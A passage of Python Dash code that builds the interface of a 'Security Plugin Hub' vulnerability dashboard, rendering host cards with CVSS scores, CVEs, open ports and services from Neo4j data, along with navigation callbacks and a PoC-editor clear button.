                              style={"color":"#d0d8e8","fontSize":"13px","fontWeight":"700",
                                     "fontFamily":"monospace","marginRight":"12px"}),
                    html.Span(f"CVSS {r.get('max_cvss',0):.1f}",
                              style={"background":_sev_color(r.get('max_cvss',0))+"22",
                                     "color":_sev_color(r.get('max_cvss',0)),
                                     "border":f"1px solid {_sev_color(r.get('max_cvss',0))}44",
                                     "borderRadius":"10px","padding":"2px 8px","fontSize":"9px","fontWeight":"700","marginRight":"8px"}),
                    html.Span(f"via {r.get('scanner','unknown')}",
                              style={"color":"#2e3d58","fontSize":"9px"}),
                ], style={"display":"flex","alignItems":"center","marginBottom":"8px","flexWrap":"wrap","gap":"4px"}),

                # Row 2: finding counts + CVEs
                html.Div([
                    html.Div([
                        html.Span(str(r.get("critical_count",0)), style={"color":"#e84040","fontWeight":"800","fontFamily":"monospace","fontSize":"13px","marginRight":"3px"}),
                        html.Span("crit ", style={"color":"#2e3d58","fontSize":"9px","marginRight":"10px"}),
                        html.Span(str(r.get("high_count",0)), style={"color":"#f07b29","fontWeight":"800","fontFamily":"monospace","fontSize":"13px","marginRight":"3px"}),
                        html.Span("high ", style={"color":"#2e3d58","fontSize":"9px","marginRight":"10px"}),
                        html.Span(str(r.get("total_findings",0)), style={"color":"#8a9cc0","fontFamily":"monospace","fontSize":"12px","marginRight":"3px"}),
                        html.Span("total", style={"color":"#2e3d58","fontSize":"9px"}),
                    ], style={"marginBottom":"6px"}),
                    html.Div([
                        html.Span("CVEs: ", style={"color":"#2e3d58","fontSize":"9px","marginRight":"4px","fontWeight":"700"}),
                        *(
                            [html.Span(cve, style={"background":"#0d1220","border":"1px solid #1e2a40","borderRadius":"3px",
                                                   "padding":"1px 5px","fontSize":"8px","color":"#5baef5",
                                                   "marginRight":"3px","fontFamily":"monospace"})
                             for cve in r.get("sample_cves",[]) if cve and cve.startswith("CVE-")]
                            or [html.Span("No CVEs", style={"color":"#2e3d58","fontSize":"9px"})]
                        ),
                    ], style={"marginBottom":"6px"}),
                ], style={"flex":"1"}),

                # Row 3: Ports + Services
                html.Div([
                    html.Div([
                        html.Span("🔌 OPEN PORTS: ", style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","marginRight":"6px"}),
                        *(
                            [html.Span(p, style={"background":"#131c2e","border":"1px solid #f07b29","borderRadius":"3px",
                                                 "padding":"1px 6px","fontSize":"9px","color":"#f07b29",
                                                 "marginRight":"3px","fontFamily":"monospace","fontWeight":"700"})
                             for p in r.get("open_ports",[]) if p and p not in ('', 'None', 'null')]
                            or [html.Span("—", style={"color":"#2e3d58","fontSize":"9px"})]
                        ),
                    ], style={"display":"flex","alignItems":"center","flexWrap":"wrap","gap":"3px","marginBottom":"5px"}),
                    html.Div([
                        html.Span("⚙ SERVICES: ", style={"color":"#a855f7","fontSize":"9px","fontWeight":"700","marginRight":"6px"}),
                        *(
                            [html.Span(svc, style={"background":"#1a0d22","border":"1px solid #a855f7","borderRadius":"3px",
                                                   "padding":"1px 6px","fontSize":"9px","color":"#c084fc",
                                                   "marginRight":"3px"})
                             for svc in r.get("services",[]) if svc and svc not in ('', 'None', 'null')]
                            or [html.Span("—", style={"color":"#2e3d58","fontSize":"9px"})]
                        ),
                    ], style={"display":"flex","alignItems":"center","flexWrap":"wrap","gap":"3px"}),
                ]),
            ], style={"background":"#111118","border":"1px solid #1e2a40","borderRadius":"8px",
                       "padding":"12px 16px","marginBottom":"8px"})
            for r in host_rows],
        ])
    else:
        host_content = html.Div(
            "No host data found. Ensure Nessus scans with host fields are ingested into Neo4j.",
            style={"color":"#2e3d58","fontSize":"12px","padding":"8px 0"})

    hosts_section = _intel_card("🖥","AFFECTED HOSTS — Network Exposure & Exploitation Surface","#5baef5", host_content)

    # ── Assemble full detail view ─────────────────────────────────────────────
    return html.Div([
        dbc.Button("← Back to Plugin Hub",
               id={"type": "plugin-back-btn", "index": "hub"},
               n_clicks=0,
               style={
                   "display": "inline-block", "marginBottom": "12px",
                   "fontSize": "12px", "color": "#888",
                   "backgroundColor": "transparent",
                   "border": "1px solid #444",
                   "borderRadius": "4px", "padding": "4px 12px",
               }),

        # Plugin header
        dbc.Card([
            dbc.CardBody([
                dbc.Row([
                    dbc.Col([
                        html.Div([
                            html.Span(plugin["icon"], style={"fontSize": "40px", "marginRight": "14px"}),
                            html.Div([
                                html.H3(plugin["name"], style={"color": "#fff", "marginBottom": "2px", "fontWeight": "700"}),
                                dbc.Badge(plugin["category"], style={"backgroundColor": plugin["cat_color"], "fontSize": "10px"}),
                            ]),
                        ], style={"display": "flex", "alignItems": "center"}),
                        html.P(plugin["description"], className="text-muted mt-2", style={"fontSize": "13px"}),
                    ], md=8),
                    dbc.Col([
                        html.Div([
                            html.Div("STATUS", style={"fontSize": "9px", "color": "#666", "letterSpacing": "1px", "marginBottom": "4px"}),
                            dbc.Badge("● ACTIVE", color="success", style={"fontSize": "12px", "padding": "6px 16px"}),
                        ], style={"textAlign": "right"}),
                        html.Div([
                            html.Div("FINDINGS", style={"fontSize": "9px", "color": "#666", "letterSpacing": "1px", "marginTop": "12px", "marginBottom": "4px"}),
                            html.Span(f"{len(data_rows)}", style={"fontSize": "28px", "fontWeight": "700", "color": plugin["cat_color"]}),
                        ], style={"textAlign": "right"}),
                    ], md=4),
                ]),
            ]),
        ], style={"backgroundColor": "#111118", "border": f"1px solid {cat_color}44", "borderRadius": "10px", "marginBottom": "16px"}),

        # Features
        dbc.Card([
            dbc.CardHeader("Features & Capabilities",
                           style={"backgroundColor": "#0d0d16", "color": cat_color, "fontWeight": "bold",
                                   "fontSize": "13px", "borderBottom": f"1px solid {cat_color}33"}),
            dbc.CardBody([
                html.Ul([html.Li(f, style={"fontSize": "12px", "color": "#ccc", "marginBottom": "4px"})
                         for f in plugin["features"]], style={"paddingLeft": "20px", "marginBottom": 0}),
            ]),
        ], style={"backgroundColor": "#111118", "border": "1px solid #222", "borderRadius": "10px", "marginBottom": "16px"}),

        # Dynamic charts
        html.Div(chart_display) if chart_display else html.Div(),

        # Live data table
        dbc.Card([
            dbc.CardHeader([
                html.Strong("📊 Live Neo4j Data", style={"color": "#fff"}),
                html.Small(f"  ({len(data_rows)} rows)", className="text-muted ms-2"),
            ], style={"backgroundColor": "#0d0d16", "borderBottom": f"1px solid {cat_color}33"}),
            dbc.CardBody(data_display, style={"padding": "0"}),
        ], style={"backgroundColor": "#0d0d16", "border": "1px solid #222", "borderRadius": "10px", "marginBottom": "16px"}),

        # ── Intelligence sections ─────────────────────────────────────────────
        hosts_section,
        mitre_section,
        edb_section,
        msf_section,
        gh_section,
        poc_section,
    ])



# ==============================================================================
# HUB LAYOUT GENERATOR
# ==============================================================================
def _build_hub_grid():
    """Build just the card grid sections (reusable)."""
    sections = []
    for cat in CATEGORY_ORDER:
        plugins_in_cat = [(pid, p) for pid, p in PLUGIN_REGISTRY.items()
                          if p["category"] == cat]
        if not plugins_in_cat:
            continue
        cat_icon = CATEGORY_ICONS.get(cat, "📦")
        cat_color = plugins_in_cat[0][1]["cat_color"]
        sections.append(html.Div([
            html.H5([
                html.Span(cat_icon, style={"marginRight": "8px"}),
                cat, " ",
                dbc.Badge(str(len(plugins_in_cat)), color="dark",
                          style={"fontSize": "10px", "verticalAlign": "middle",
                                 "border": f"1px solid {cat_color}44"}),
            ], style={"color": cat_color, "fontWeight": "700", "marginTop": "20px",
                       "marginBottom": "12px", "borderBottom": f"1px solid {cat_color}22",
                       "paddingBottom": "8px"}),
            dbc.Row([_build_plugin_card(pid, p) for pid, p in plugins_in_cat]),
        ]))
    return sections


def generate_plugin_hub():
    """Generate the full Plugin Hub layout — self-contained with its own store + callback."""
    return html.Div([
        # Self-contained store: tracks which plugin is open (None = hub view)
        dcc.Store(id="plugin-view-store", storage_type="memory", data=None),

        # Header
        html.Div([
            html.H3([
                html.Span("🔌", style={"marginRight": "10px"}),
                "Security Plugin Hub",
            ], style={"color": "#fff", "fontWeight": "700", "marginBottom": "4px"}),
            html.P([
                f"{len(PLUGIN_REGISTRY)} plugins across {len(CATEGORY_ORDER)} categories — ",
                "powered by live Neo4j vulnerability graph data.",
            ], className="text-muted", style={"fontSize": "13px", "marginBottom": "0"}),
        ], style={"marginBottom": "10px", "padding": "16px 0"}),

        # Summary stats row
        dbc.Row([
            dbc.Col(dbc.Card(dbc.CardBody([
                html.Div(str(len(PLUGIN_REGISTRY)), style={
                    "fontSize": "32px", "fontWeight": "700", "color": "#ffaa00",
                    "lineHeight": "1",
                }),
                html.Div("Total Plugins", style={"fontSize": "10px", "color": "#888",
                                                   "letterSpacing": "1px", "marginTop": "4px"}),
            ]), style={"backgroundColor": "#111118", "border": "1px solid #333",
                        "borderRadius": "8px", "textAlign": "center"}), md=2),
            dbc.Col(dbc.Card(dbc.CardBody([
                html.Div(str(len(CATEGORY_ORDER)), style={
                    "fontSize": "32px", "fontWeight": "700", "color": "#00aaff",
                    "lineHeight": "1",
                }),
                html.Div("Categories", style={"fontSize": "10px", "color": "#888",
                                               "letterSpacing": "1px", "marginTop": "4px"}),
            ]), style={"backgroundColor": "#111118", "border": "1px solid #333",
                        "borderRadius": "8px", "textAlign": "center"}), md=2),
            dbc.Col(dbc.Card(dbc.CardBody([
                html.Div("●", style={
                    "fontSize": "32px", "fontWeight": "700", "color": "#44ff88",
                    "lineHeight": "1",
                }),
                html.Div("All Active", style={"fontSize": "10px", "color": "#888",
                                               "letterSpacing": "1px", "marginTop": "4px"}),
            ]), style={"backgroundColor": "#111118", "border": "1px solid #333",
                        "borderRadius": "8px", "textAlign": "center"}), md=2),
        ], className="mb-3 g-2"),

        # Single content area: either hub grid OR plugin detail
        dcc.Loading(
            html.Div(id="plugin-content-main", children=_build_hub_grid()),
            type="dot",
            color="#ff6b35",
        ),
    ], style={"padding": "10px 20px"})


# ==============================================================================
# CALLBACKS — self-contained plugin navigation
# ==============================================================================

@callback(
    Output("plugin-view-store", "data"),
    Input({"type": "plugin-open-btn", "index": ALL}, "n_clicks"),
    Input({"type": "plugin-back-btn", "index": ALL}, "n_clicks"),
    prevent_initial_call=True,
)
def update_plugin_store(open_clicks, back_clicks):
    """Write the selected plugin ID (or None for back) into the store."""
    ctx = callback_context
    if not ctx.triggered:
        return no_update

    # Use triggered_id: for MATCH/ALL inputs it's a dict
    tid = ctx.triggered_id
    if isinstance(tid, dict):
        if tid.get("type") == "plugin-back-btn":
            return None
        elif tid.get("type") == "plugin-open-btn":
            pid = tid.get("index", "")
            if pid in PLUGIN_REGISTRY:
                return pid

    return no_update


@callback(
    Output("plugin-content-main", "children"),
    Input("plugin-view-store", "data"),
    prevent_initial_call=False,
)
def render_plugin_content(selected_pid):
    """Render either the hub grid or the plugin detail view."""
    if selected_pid and selected_pid in PLUGIN_REGISTRY:
        return _build_plugin_detail(selected_pid)
    return _build_hub_grid()


# ==============================================================================
# PoC WORKSPACE CALLBACK — clear button
# ==============================================================================
@callback(
    Output({"type": "plugin-poc-editor", "index": dash.MATCH}, "value"),
    Input({"type": "plugin-poc-clear",   "index": dash.MATCH}, "n_clicks"),
    prevent_initial_call=True,
)
def clear_poc_editor(n_clicks):
    """Clear the PoC workspace textarea."""
    if n_clicks:
        return ""
    return no_update
